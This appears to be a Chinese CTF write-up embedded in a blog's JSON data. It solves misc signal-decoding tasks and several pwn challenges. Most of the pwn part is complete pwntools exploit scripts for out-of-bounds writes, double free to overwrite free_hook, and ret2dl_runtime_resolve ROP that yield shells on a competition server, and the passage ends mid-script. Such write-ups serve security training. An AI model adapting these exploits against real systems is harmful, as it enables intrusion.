2":{"host":"https://remark.haoyizebo.com","site_id":"haoyizebo","max_shown_comments":10,"locale":"zh"},"archive":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"归 档"},"tag":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"标 签","tagcloud":{"min_font":15,"max_font":30,"unit":"px","start_color":"#BBBBEE","end_color":"#337ab7"}},"about":{"banner_img":"/img/static/default1.png","banner_img_height":50,"banner_mask_alpha":0.3,"subtitle":"About me","avatar":"/img/static/avatar.png","name":"Lzywi","introduce":"Life is short, use Python.","icons":[{"class":"iconfont icon-github-fill","link":"https://github.com","tip":"GitHub"},{"class":"iconfont icon-douban-fill","link":"https://douban.com","tip":"豆瓣"},{"class":"iconfont icon-wechat-fill","qrcode":"/img/static/WeChat.jpg"}]},"page404":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"404"},"links":{"banner_img":"/img/static/default1.png","banner_img_height":55,"banner_mask_alpha":0.3,"subtitle":"Link","items":[{"title":" ZoE blog","intro":"Pwn的挖坑填坑之旅","link":"https://zoepla.github.io/#blog","image":"/img/Link/ZoE.jpg"},{"title":"Junay blog","intro":"网络安全爱好者","link":"https://delcoding.github.io","image":"/img/Link/Junay.png"},{"title":"Rhy7hm blog","intro":"恭喜你发现了毫无技术含量的博客","link":"https://rhythmmark.github.io","image":"/img/Link/Rhy7hm.png"},{"title":"Cy9nus blog","intro":"人如果没有梦想，跟咸鱼有什么区别","link":"https://cy9nusg4rd3n.github.io/","image":"/img/Link/Cy9nus.jpg"}]}}}},"excerpt":"<p>大佬的博客–&gt;<a href=\"https://www.ctfwp.com/articals/2019national.html\" target=\"_blank\" rel=\"noopener\">传送门</a><br>","more":"</p>\n<h3 id=\"misc\"><a href=\"#misc\" class=\"headerlink\" title=\"misc\"></a>misc</h3><h4 id=\"签到\"><a href=\"#签到\" class=\"headerlink\" title=\"签到\"></a>签到</h4><p>摄像头捕捉到三个人的脸即可</p>\n<h3 id=\"saleae\"><a href=\"#saleae\" class=\"headerlink\" title=\"saleae\"></a>saleae</h3><p>下载回来一个<code>saleae.logicdata</code>文件，经搜索发现这个saleae的可以打开的文件类型，官网地址–&gt;<a href=\"https://www.saleae.com/zh/\" target=\"_blank\" rel=\"noopener\">传送门</a>，打开文件只发现一些波形<br><img src=\"/img/2019-04-23/1.png\" srcset=\"/img/static/loading.gif\" alt=\"1\"><br>网上搜索资料看到一篇教程通过xor两条数据流得到信息，上面一条是当上面波形的电平为高电平且下面那条也是高电平时为1，下面那条是低电平则为0，如图<br><img src=\"/img/2019-04-23/2.png\" srcset=\"/img/static/loading.gif\" alt=\"2\"><br>最后得到一串数据<br><pre><code class=\"hljs undefined\"><span class=\"hljs-number\">011001100110110001100001011001110111101100110001001100100011000000110111001100010011001100111001001101110010110100110001001110010110010000110001001011010011010000111000011001010011011000101101011000100110010100111000011000110010110100110111001110000011010001100010001110000011100101100001001110010011010101100101001100000011011101111101</span></code></pre></p>\n<p>8个一组得到flag</p>\n<h4 id=\"usbasp\"><a href=\"#usbasp\" class=\"headerlink\" title=\"usbasp\"></a>usbasp</h4><p>打开文件后在<code>analyzer</code>里选择<code>SPI</code>，设置选项最下面选择<code>enable line is active hight</code><br><img src=\"/img/2019-04-23/7.png\" srcset=\"/img/static/loading.gif\" alt=\"7\"><br>右下面可以明显看到flag导出即可<br><img src=\"/img/2019-04-23/9.png\" srcset=\"/img/static/loading.gif\" alt=\"9\"></p>\n<h3 id=\"pwn\"><a href=\"#pwn\" class=\"headerlink\" title=\"pwn\"></a>pwn</h3><h4 id=\"your-pwn\"><a href=\"#your-pwn\" class=\"headerlink\" title=\"your-pwn\"></a>your-pwn</h4><p>在函数<code>sub_B35</code>里面，没有对<code>index(v1)</code>进行检查，从而造成任意地址泄露和任意地址更改。直接改返回地址为<code>one_gadget</code>即可<br><pre><code class=\"hljs undefined\">for ( <span class=\"hljs-name\">i</span> = <span class=\"hljs-number\">0</span><span class=\"hljs-comment\">; i &lt;= 40; ++i )</span>\n&#123;\nputs(<span class=\"hljs-string\">\"input index\"</span>)<span class=\"hljs-comment\">;</span>\n__isoc99_scanf(<span class=\"hljs-string\">\"%d\"</span>, <span class=\"hljs-symbol\">&amp;v1</span>)<span class=\"hljs-comment\">;</span>\nprintf(<span class=\"hljs-string\">\"now value(hex) %x\\n\"</span>, (<span class=\"hljs-name\">unsigned</span> int)v4[v1])<span class=\"hljs-comment\">;</span>\nputs(<span class=\"hljs-string\">\"input new value\"</span>)<span class=\"hljs-comment\">;</span>\n__isoc99_scanf(<span class=\"hljs-string\">\"%d\"</span>, <span class=\"hljs-symbol\">&amp;v2</span>)<span class=\"hljs-comment\">;</span>\nv4[v1] = v2<span class=\"hljs-comment\">;</span>\n&#125;</code></pre></p>\n<p>详细脚本如下：<br><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *\n<span class=\"hljs-comment\">#context(os='linux',arch='amd64',aslr = 'False',log_level='debug')</span>\nlocal = <span class=\"hljs-number\">0</span>\n<span class=\"hljs-keyword\">if</span> local:\n\tp = process(<span class=\"hljs-string\">\"./pwn\"</span>)\n<span class=\"hljs-keyword\">else</span>:\n\tp = remote(<span class=\"hljs-string\">\"39.97.228.196\"</span>,<span class=\"hljs-number\">60007</span>)\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">pass_</span><span class=\"hljs-params\">()</span>:</span>\n\tp.recvuntil(<span class=\"hljs-string\">\"name\"</span>)\n\tp.sendline(<span class=\"hljs-string\">\"Team233\"</span>)\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">change</span><span class=\"hljs-params\">(index, addr)</span>:</span>\n\t<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> range(<span class=\"hljs-number\">8</span>):\n\t\tp.recvuntil(<span class=\"hljs-string\">\"index\\n\"</span>)\n\t\tp.sendline(str(index+i))\n\t\tp.recvuntil(<span class=\"hljs-string\">\"now value(hex) \"</span>)\n\t\tdata = p.recvn(<span class=\"hljs-number\">1</span>)\n\t\t<span class=\"hljs-comment\">#print(\"data = \" + str(data))</span>\n\t\tp.recvuntil(<span class=\"hljs-string\">\"input new value\\n\"</span>)\n\t\tp.sendline(str(addr))\n\t\taddr = addr &gt;&gt; <span class=\"hljs-number\">8</span>\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">leak</span><span class=\"hljs-params\">(index)</span>:</span>\n\taddr = <span class=\"hljs-string\">\"\"</span>\n\t<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> range(<span class=\"hljs-number\">8</span>):\n\t\tp.recvuntil(<span class=\"hljs-string\">\"index\\n\"</span>)\n\t\tp.sendline(str(index+i))\n\t\tp.recvuntil(<span class=\"hljs-string\">\"now value(hex) \"</span>)\n\t\tdata = int(p.recvuntil(<span class=\"hljs-string\">\"\\n\"</span>,drop=<span class=\"hljs-keyword\">True</span>),<span class=\"hljs-number\">16</span>)\n\t\t<span class=\"hljs-keyword\">if</span> data &gt; <span class=\"hljs-number\">300</span>:\n\t\t\tdata = data - <span class=\"hljs-number\">0xffffff00</span>\n\t\tp.recvuntil(<span class=\"hljs-string\">\"input new value\\n\"</span>)\n\t\tp.sendline(str(data))\n\t\taddr += chr(data)\n\taddr = u64(addr)\n\t<span class=\"hljs-keyword\">return</span> addr\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">exp</span><span class=\"hljs-params\">()</span>:</span>\n\tpass_()\n\t<span class=\"hljs-comment\">#gdb.attach(p)addr = leak(0x158)</span>\n\telf_base = addr - <span class=\"hljs-number\">0xb11</span>\n\t<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'[*] elf_base :'</span>,hex(elf_base)\n\taddr = leak(<span class=\"hljs-number\">0x160</span>+<span class=\"hljs-number\">0x118</span>)\n\tlibc_base = addr - <span class=\"hljs-number\">0x20830</span>\n\tone_shot = libc_base + <span class=\"hljs-number\">0xf02a4</span>\n\t<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'[*] one_shot :'</span>,hex(one_shot)\n\t<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'[*] libc_base :'</span>,hex(libc_base)\n\tpause()\n\tchange(<span class=\"hljs-number\">0x158</span>,one_shot)\n\tp.sendline(<span class=\"hljs-string\">\"no\"</span>)\n\tp.sendline(<span class=\"hljs-string\">\"cat flag\"</span>)\n\tp.interactive()\nexp()</code></pre></p>\n<p><img src=\"/img/2019-04-23/3.png\" srcset=\"/img/static/loading.gif\" alt=\"3\"></p>\n<h4 id=\"daily\"><a href=\"#daily\" class=\"headerlink\" title=\"daily\"></a>daily</h4><p>由于是<code>%s</code>打印内 容，会一直打印遇到<code>\\x00</code>才会停止，而且<code>add</code>的时候通过<code>read</code>读入没有写入字符串后缀，所以可以利用这一点可以泄露<code>libc</code>地址和<code>heap</code>地址。泄露利用如下：<br><pre><code class=\"hljs undefined\"><span class=\"hljs-function\"><span class=\"hljs-title\">create</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>x60,<span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">0</span>x20)</span></span>#<span class=\"hljs-number\">0</span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">create</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>x60,<span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">0</span>x20)</span></span>#<span class=\"hljs-number\">1</span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">create</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>x60,<span class=\"hljs-string\">\"b\"</span>*<span class=\"hljs-number\">0</span>x20)</span></span>#<span class=\"hljs-number\">2</span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">delete</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>)</span></span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">delete</span><span class=\"hljs-params\">(<span class=\"hljs-number\">1</span>)</span></span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">create</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>x60,<span class=\"hljs-string\">\"a\"</span>)</span></span>#<span class=\"hljs-number\">0</span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">show</span><span class=\"hljs-params\">()</span></span>\n<span class=\"hljs-selector-tag\">p</span>.recvuntil(<span class=\"hljs-string\">\"0 : a\"</span>)\ndata = <span class=\"hljs-string\">\"\\x00\"</span>+<span class=\"hljs-selector-tag\">p</span>.recvuntil(<span class=\"hljs-string\">\"2\"</span>,drop=True)\nheap = u64(data.ljust(<span class=\"hljs-number\">8</span>,<span class=\"hljs-string\">\"\\x00\"</span>))\nprint <span class=\"hljs-string\">\"[*]heap : \"</span>, hex(heap)\n<span class=\"hljs-function\"><span class=\"hljs-title\">create</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>x100,<span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">0</span>x20)</span></span>#<span class=\"hljs-number\">1</span> \n<span class=\"hljs-function\"><span class=\"hljs-title\">create</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>x100,<span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">0</span>x20)</span></span>#<span class=\"hljs-number\">3</span> \n<span class=\"hljs-function\"><span class=\"hljs-title\">delete</span><span class=\"hljs-params\">(<span class=\"hljs-number\">1</span>)</span></span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">create</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>x20,<span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">0</span>x20)</span></span>#<span class=\"hljs-number\">1</span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">create</span><span class=\"hljs-params\">(<span class=\"hljs-number\">0</span>xd0,<span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">8</span>)</span></span>#<span class=\"hljs-number\">4</span>\n<span class=\"hljs-function\"><span class=\"hljs-title\">show</span><span class=\"hljs-params\">()</span></span>\n<span class=\"hljs-selector-tag\">p</span>.recvuntil(<span class=\"hljs-string\">\"4 : aaaaaaaa\"</span>)\ndata = <span class=\"hljs-selector-tag\">p</span>.recvn(<span class=\"hljs-number\">6</span>) + <span class=\"hljs-string\">\"\\x00\\x00\"</span>\nlibc_base = u64(data) - <span class=\"hljs-number\">0</span>x3c4b78</code></pre></p>\n<p>然后利用<code>free</code>的时候没有检查<code>index(v1)</code>，漏洞点如下程序部分代码，造成<code>UAF</code>分配到<code>bss</code>上的<code>chunk_list</code>，然后改<code>free</code>就可以了 。<br><pre><code class=\"hljs undefined\">printf(<span class=\"hljs-string\">\"Please enter the index of daily:\"</span>)<span class=\"hljs-comment\">;</span>\nread(<span class=\"hljs-number\">0</span>, &amp;<span class=\"hljs-keyword\">buf, </span><span class=\"hljs-number\">8</span>uLL)<span class=\"hljs-comment\">;</span>\n<span class=\"hljs-built_in\">v1</span> = atoi(&amp;<span class=\"hljs-keyword\">buf);\n</span>if ( chunk[<span class=\"hljs-built_in\">v1</span>].ptr )\n&#123;\nfree((void *)chunk[<span class=\"hljs-built_in\">v1</span>].ptr)<span class=\"hljs-comment\">;</span>\nchunk[<span class=\"hljs-built_in\">v1</span>].ptr = <span class=\"hljs-number\">0</span>LL<span class=\"hljs-comment\">;</span>\nLODWORD(chunk[<span class=\"hljs-built_in\">v1</span>].len) = <span class=\"hljs-number\">0</span><span class=\"hljs-comment\">;</span>\nputs(<span class=\"hljs-string\">\"remove successful!!\"</span>)<span class=\"hljs-comment\">;</span>\n--chunk_num<span class=\"hljs-comment\">;</span>\n&#125;</code></pre></p>\n<p>然后利用<code>Double free</code>得到<code>bss</code>段上的<code>chunk_list</code>,然后控制<code>chunk</code>，实现任意地址写，然后我们写<code>free_hook</code>地址为<code>system</code>，再<code>free</code>的时候就可以<code>getshell</code>了。在这之前，我们尝试了申请到<code>malloc_hook</code>前面然后把<code>malloc_hoook</code>覆盖为<code>one_gadget</code>，但是没有一个<code>one_gadget</code>可以成功，主要是因为条件没有满足，后来就直接<code>free_hook</code>了。详细脚本如下：<br><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *\n<span class=\"hljs-comment\">#context(os='linux',arch='amd64',aslr = 'False',log_level='debug')</span>\nlocal = <span class=\"hljs-number\">0</span>\n<span class=\"hljs-keyword\">if</span> local:\n\tp = process(<span class=\"hljs-string\">\"./pwn\"</span>)\n<span class=\"hljs-keyword\">else</span>:\n\tp = remote(<span class=\"hljs-string\">\"39.97.228.196\"</span>,<span class=\"hljs-number\">60006</span>)\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">show</span><span class=\"hljs-params\">()</span>:</span>\n\tp.recvuntil(<span class=\"hljs-string\">\":\"</span>)\n\tp.sendline(<span class=\"hljs-string\">\"1\"</span>) \n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">create</span><span class=\"hljs-params\">(lens,content)</span>:</span>\n\tp.recvuntil(<span class=\"hljs-string\">\":\"</span>)\n\tp.sendline(<span class=\"hljs-string\">\"2\"</span>) \n\tp.recvuntil(<span class=\"hljs-string\">\":\"</span>)\n\tp.sendline(str(lens)) \n\tp.recv()\n\tp.send(content)\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">change</span><span class=\"hljs-params\">(index,content)</span>:</span>\n\tp.recvuntil(<span class=\"hljs-string\">\":\"</span>)\n\tp.sendline(<span class=\"hljs-string\">\"3\"</span>) \n\tp.recvuntil(<span class=\"hljs-string\">\":\"</span>)\n\tp.sendline(str(index)) \n\tp.recv()\n\tp.send(content)\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">delete</span><span class=\"hljs-params\">(index)</span>:</span>\n\tp.recvuntil(<span class=\"hljs-string\">\":\"</span>)\n\tp.sendline(<span class=\"hljs-string\">\"4\"</span>) \n\tp.recvuntil(<span class=\"hljs-string\">\":\"</span>)\n\tp.sendline(str(index)) \nchunk_list = <span class=\"hljs-number\">0x602060</span>\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">exp</span><span class=\"hljs-params\">()</span>:</span> \n\tcreate(<span class=\"hljs-number\">0x60</span>,<span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">0x20</span>)<span class=\"hljs-comment\">#0</span>\n\tcreate(<span class=\"hljs-number\">0x60</span>,<span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">0x20</span>)<span class=\"hljs-comment\">#1</span>\n\tcreate(<span class=\"hljs-number\">0x60</span>,<span class=\"hljs-string\">\"b\"</span>*<span class=\"hljs-number\">0x20</span>)<span class=\"hljs-comment\">#2</span>\n\tdelete(<span class=\"hljs-number\">0</span>)\n\tdelete(<span class=\"hljs-number\">1</span>)\n\tcreate(<span class=\"hljs-number\">0x60</span>,<span class=\"hljs-string\">\"a\"</span>)<span class=\"hljs-comment\">#0</span>\n\tshow()\n\tp.recvuntil(<span class=\"hljs-string\">\"0 : a\"</span>)\n\tdata = <span class=\"hljs-string\">\"\\x00\"</span>+p.recvuntil(<span class=\"hljs-string\">\"2\"</span>,drop=<span class=\"hljs-keyword\">True</span>)\n\theap = u64(data.ljust(<span class=\"hljs-number\">8</span>,<span class=\"hljs-string\">\"\\x00\"</span>))\n\t<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"[*]heap : \"</span>, hex(heap)\n\tcreate(<span class=\"hljs-number\">0x100</span>,<span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">0x20</span>)<span class=\"hljs-comment\">#1</span>\n\tcreate(<span class=\"hljs-number\">0x100</span>,<span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">0x20</span>)<span class=\"hljs-comment\">#3</span>\n\tdelete(<span class=\"hljs-number\">1</span>)\n\tcreate(<span class=\"hljs-number\">0x20</span>,<span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">0x20</span>)<span class=\"hljs-comment\">#1</span>\n\tcreate(<span class=\"hljs-number\">0xd0</span>,<span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">8</span>)<span class=\"hljs-comment\">#4</span>\n\tshow()\n\tp.recvuntil(<span class=\"hljs-string\">\"4 : aaaaaaaa\"</span>)\n\tdata = p.recvn(<span class=\"hljs-number\">6</span>) + <span class=\"hljs-string\">\"\\x00\\x00\"</span>\n\tlibc_base = u64(data) - <span class=\"hljs-number\">0x3c4b78</span>\n\tmalloc_hook = libc_base + <span class=\"hljs-number\">0x3c4b10</span>\n\tone_shot = libc_base + <span class=\"hljs-number\">0xf02a4</span>\n\tfree_hook = libc_base + <span class=\"hljs-number\">0x3c67a8</span>\n\tsystem = libc_base + <span class=\"hljs-number\">0x45390</span>\n\t<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'[*]libc_base : '</span>,hex(libc_base)\n\t<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'[*]malloc_hook : '</span>,hex(malloc_hook)\n\t<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'[*]free_hook : '</span>,hex(free_hook)\n\t<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'[*]one_shot : '</span>,hex(one_shot)\n\t<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'[*]system : '</span>,hex(system)\n\tindex = (heap - chunk_list + <span class=\"hljs-number\">8</span>)/<span class=\"hljs-number\">0x10</span> + <span class=\"hljs-number\">15</span>\n\t<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">'[*]index : '</span>,hex(index)\n\tchange(<span class=\"hljs-number\">2</span>,<span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">8</span>+p64(heap+<span class=\"hljs-number\">0x10</span>))\n\tcreate(<span class=\"hljs-number\">0x71</span>,<span class=\"hljs-string\">\"h\"</span>*<span class=\"hljs-number\">0x71</span>)<span class=\"hljs-comment\">#5</span>\n\tcreate(<span class=\"hljs-number\">0x60</span>,<span class=\"hljs-string\">\"e\"</span>*<span class=\"hljs-number\">0x60</span>) <span class=\"hljs-comment\">#6</span>\n\tcreate(<span class=\"hljs-number\">0x60</span>,<span class=\"hljs-string\">\"b\"</span>*<span class=\"hljs-number\">0x60</span>) <span class=\"hljs-comment\">#7</span>\n\t<span class=\"hljs-comment\">#gdb.attach(p)</span>\n\tdelete(<span class=\"hljs-number\">6</span>)\n\tdelete(<span class=\"hljs-number\">7</span>)\n\tdelete(index)\n\tcreate(<span class=\"hljs-number\">0x60</span>,p64(<span class=\"hljs-number\">0x6020a8</span>)) <span class=\"hljs-comment\">#6</span>\n\tcreate(<span class=\"hljs-number\">0x60</span>,<span class=\"hljs-string\">\"c\"</span>*<span class=\"hljs-number\">0x60</span>) <span class=\"hljs-comment\">#7</span>\n\tcreate(<span class=\"hljs-number\">0x60</span>,<span class=\"hljs-string\">\"/bin/sh\\x00\"</span>) <span class=\"hljs-comment\">#8</span>\n\tpayload = p64(free_hook) + p64(<span class=\"hljs-number\">0x20</span>) + p64(heap+<span class=\"hljs-number\">0x10</span>) payload = payload.ljust(<span class=\"hljs-number\">0x60</span>,<span class=\"hljs-string\">\"\\x00\"</span>)\n\tcreate(<span class=\"hljs-number\">0x60</span>, payload) <span class=\"hljs-comment\">#9</span>\n\tshow()\n\tchange(<span class=\"hljs-number\">5</span>,p64(system))\n\tdelete(<span class=\"hljs-number\">6</span>)\n\tp.recv()\n\t<span class=\"hljs-comment\">#gdb.attach(p)</span>\n\tp.interactive() \n\nexp()</code></pre></p>\n<p>最后成功 getshell<br><img src=\"/img/2019-04-23/4.png\" srcset=\"/img/static/loading.gif\" alt=\"4\"></p>\n<h4 id=\"babypwn\"><a href=\"#babypwn\" class=\"headerlink\" title=\"babypwn\"></a>babypwn</h4><p>直接<code>read</code>读入<code>0x100</code>直接造成栈溢出，但是这题的难点在于没有泄露函数，不能直接<code>return to libc</code>，所以这里利用<code>ret2_dl_runtime_resolve</code>，之前做过0ctf2018的babystack 跟这个类似，先是尝试了<code>roputils</code>库实现，后来发现有点问题总是调不对，后来直接手工干了一波。操作如下：<br><pre><code class=\"hljs python\"><span class=\"hljs-comment\"># -*- coding:utf-8 -*-</span>\n<span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *\ncontext.log_level = <span class=\"hljs-string\">'debug'</span>\n<span class=\"hljs-comment\">#p = process('./pwn')</span>\np = remote(ip,port)\nelf = ELF(<span class=\"hljs-string\">'./pwn'</span>)\nread_plt = elf.plt[<span class=\"hljs-string\">'read'</span>]\nalarm_plt = elf.plt[<span class=\"hljs-string\">'alarm'</span>]\npop_ebp_ret = <span class=\"hljs-number\">0x080485db</span>\nppp_ret = <span class=\"hljs-number\">0x080485d9</span>\npp_ebp_ret = <span class=\"hljs-number\">0x080485da</span>\nleave_ret = <span class=\"hljs-number\">0x08048448</span>\nstack_size = <span class=\"hljs-number\">0x800</span>\nbss_addr = <span class=\"hljs-number\">0x0804a040</span> <span class=\"hljs-comment\">#readelf -S babystack | grep \".bss\" base_stage = bss_addr + stack_size</span>\nplt_0 = <span class=\"hljs-number\">0x8048380</span> <span class=\"hljs-comment\"># objdump -d -j .plt babystack</span>\nrel_plt = <span class=\"hljs-number\">0x804833c</span> <span class=\"hljs-comment\"># objdump -s -j .rel.plt babystack index_offset = (base_stage + 28) - rel_plt</span>\nalarm_got = elf.got[<span class=\"hljs-string\">'alarm'</span>]\n<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"alarm_got: \"</span>,hex(alarm_got)\n<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"alarm_plt: \"</span>,hex(alarm_plt)\n<span class=\"hljs-keyword\">print</span> <span class=\"hljs-string\">\"read_plt: \"</span>,hex(read_plt)\ndynsym = <span class=\"hljs-number\">0x80481DC</span>\ndynstr = <span class=\"hljs-number\">0x804827C</span>\nfake_sym_addr = base_stage + <span class=\"hljs-number\">36</span>\nalign = <span class=\"hljs-number\">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class=\"hljs-number\">0xf</span>) fake_sym_addr = fake_sym_addr + align\nindex_dynsym = (fake_sym_addr - dynsym) / <span class=\"hljs-number\">0x10</span>\nr_info = index_dynsym &lt;&lt; <span class=\"hljs-number\">8</span> | <span class=\"hljs-number\">0x7</span>\nfake_reloc = p32(alarm_got) + p32(r_info)\nst_name = fake_sym_addr + <span class=\"hljs-number\">0x10</span> - dynstr\nfake_sym = p32(st_name) + p32(<span class=\"hljs-number\">0</span>) + p32(<span class=\"hljs-number\">0</span>) + p32(<span class=\"hljs-number\">0x12</span>)\npayload = <span class=\"hljs-string\">'a'</span>*<span class=\"hljs-number\">0x28</span> + p32(bss_addr)\npayload += p32(read_plt) + p32(leave_ret) + p32(<span class=\"hljs-number\">0</span>) + p32(bss_addr) + p32(<span class=\"hljs-number\">36</span>)\n<span class=\"hljs-comment\">#raw_input(\"go:\")</span>\np.send(payload)\n<span class=\"hljs-comment\">#fake stack 1 bss_addr</span>\npayload1 = <span class=\"hljs-string\">'aaaa'</span> <span class=\"hljs-comment\">#pop ebp</span>\npayload1 += p32(read_plt) + p32(ppp_ret) + p32(<span class=\"hljs-number\">0</span>) + p32(base_stage) + p32(<span class=\"hljs-number\">100</span>) payload1 += p32(pop_ebp_ret) + p32(base_stage) <span class=\"hljs-comment\">#fake stack again</span>\npayload1 += p32(leave_ret) <span class=\"hljs-comment\">#leave: mov esp,ebp; pop ebp</span>\np.send(payload1)\ncmd = <span class=\"hljs-string\">\"/bin/sh\"</span>\n<span class=\"hljs-comment\">#fake stack 2 base_stage</span>\npayload2 = <span class=\"hljs-string\">'bbbb'</span>\npayload2 += p32(plt_0)\npayload2 += p32(index_offset)\npayload2 += <span class=\"hljs-string\">'aaaa'</span>\npayload2 += p32(base_stage + <span class=\"hljs-number\">80</span>)\npayload2 += <span class=\"hljs-string\">'aaaa'</span>\npayload2 += <span class=\"hljs-string\">'aaaa'</span>\npayload2 += fake_reloc <span class=\"hljs-comment\">#base_stage+28</span>\npayload2 += <span class=\"hljs-string\">'b'</span> * align\npayload2 += fake_sym <span class=\"hljs-comment\">#base_stage+36</span>\npayload2 += <span class=\"hljs-string\">\"system\\x00\"</span>\npayload2 += <span class=\"hljs-string\">'a'</span> * (<span class=\"hljs-number\">80</span> - len(payload2))\npayload2 += cmd +<span class=\"hljs-string\">'\\x00'</span>\n<span class=\"hljs-comment\">#payload2 += 'a' * (100 - len(payload2))</span>\n<span class=\"hljs-keyword\">print</span> len(payload2)\nsleep(<span class=\"hljs-number\">1</span>)\np.sendline(payload2)\n<span class=\"hljs-comment\">#p.sendline(\"icq0030af22ece42d03523c08138525f\")</span>\np.interactive()</code></pre></p>\n<p><img src=\"/img/2019-04-23/22.png\" srcset=\"/img/static/loading.gif\" alt=\"22\"></p>\n<h4 id=\"double\"><a href=\"#double\" class=\"headerlink\" title=\"double\"></a>double</h4><p><img src=\"/img/2019-04-23/5.png\" srcset=\"/img/static/loading.gif\" alt=\"5\"><br>由于这个对比，只要输入的<code>data</code>相同则不会分配堆块给<code>data</code>，造成两个指针指向同一个<code>data</code>。只要申请两个相同内容大小为<code>smallbin</code>，<code>free</code>掉 一个指针，<code>show</code>另一个指针即可获得<code>libc</code>的地址。同理只要<code>free</code>掉其中一个，在对另一个相同指向的指针进行<code>edit</code>，就可以改变<code>fd</code>。将<code>fd</code>改成<code>malloc_hook</code>，再将<code>malloc_hook</code>的值改成<code>one_gadget</code>即可getshell。<br>详细脚本如下：<br><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *\n<span class=\"hljs-comment\">#context(os='linux',arch='amd64',aslr = 'False',log_level='debug')</span>\nlocal = <span class=\"hljs-number\">0</span>\n<span class=\"hljs-keyword\">if</span> local:\n\tp = process(<span class=\"hljs-string\">\"./pwn\"</span>)\n<span class=\"hljs-keyword\">else</span>:\n\tp = remote(<span class=\"hljs-string\">\"39.97.228.196\"</span>,<span class=\"hljs-number\">60004</span>)\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">create</span><span class=\"hljs-params\">(content)</span>:</span>\n\tp.recvuntil(<span class=\"hljs-string\">\"&gt; \"</span>)\n\tp.sendline(<span class=\"hljs-string\">\"1\"</span>)\n\tsleep(<span class=\"hljs-number\">0.1</span>)\n\tp.sendline(content)\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">show</span><span class=\"hljs-params\">(index)</span>:</span>\n\tp.recvuntil(<span class=\"hljs-string\">\"&gt; \"</span>)\n\tp.sendline(<span class=\"hljs-string\">\"2\"</span>)\n\tp.recv()\n\tp.sendline(str(index))\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">edit</span><span class=\"hljs-params\">(index,content)</span>:</span>\n\tp.recvuntil(<span class=\"hljs-string\">\"&gt; \"</span>)\n\tp.sendline(<span class=\"hljs-string\">\"3\"</span>)\n\tp.recv()\n\tp.sendline(str(index))\n\tsleep(<span class=\"hljs-number\">0.1</span>)\n\tp.sendline(content)\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">free</span><span 